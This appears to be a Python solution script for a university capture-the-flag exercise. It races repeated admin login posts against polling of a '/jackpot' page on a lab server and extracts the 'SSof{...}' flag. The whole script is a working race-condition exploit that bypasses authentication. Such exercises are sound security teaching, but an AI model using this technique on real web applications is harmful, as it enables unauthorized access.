import re
import requests
from multiprocessing import Process

URL = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22652"

session = requests.session()
r = session.get(URL)

params = {
    'username': 'admin', 
    'password': '1234'
}

def try_login():
    while True:
        session.post(URL+"/login", data=params)

login = Process(target=try_login)
login.start()

while True:
    r = session.get(URL+"/jackpot")
    match = re.search("SSof{.*}", r.text)
    if match:
        print(match.group(0))
        break

login.terminate()